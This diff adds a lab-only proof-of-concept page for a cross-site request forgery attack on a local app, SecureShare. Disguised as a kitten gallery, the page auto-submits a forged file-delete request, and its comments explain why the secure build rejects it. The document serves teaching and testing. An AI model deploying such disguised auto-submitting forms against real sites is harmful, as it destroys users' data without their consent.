@@ -1,0 +1,29 @@
+<!doctype html>
+<!-- ========================================================================
+     LAB-ONLY — CSRF (CWE-352) attack proof-of-concept.
+
+     Host this page on a DIFFERENT origin (e.g. http://localhost:8001 served
+     with `python -m http.server 8001`) and open it while logged in to
+     SecureShare on http://127.0.0.1:5000.
+
+     AGAINST THE VULNERABLE BUILD (no CSRF token, no SameSite):
+       the forged POST below is sent with the victim's session cookie and the
+       file is deleted WITHOUT the victim's consent.
+
+     AGAINST THE SECURE BUILD (this repo):
+       the request is REJECTED with HTTP 400 "The CSRF token is missing." and
+       the SameSite=Lax cookie is not sent cross-site -> attack fails.
+     ==================================================================== -->
+<html lang="en">
+<head><meta charset="utf-8"><title>Totally harmless kitten gallery</title></head>
+<body>
+  <h1>😺 Free kittens</h1>
+  <p>Look at this cat while your account is attacked in the background…</p>
+
+  <!-- Auto-submitting forged state-changing request (no CSRF token). -->
+  <form id="x" action="http://127.0.0.1:5000/file/1/delete" method="POST">
+    <!-- Note: no csrf_token field. The secure server requires it. -->
+  </form>
+  <script>document.getElementById('x').submit();</script>
+</body>
+</html>
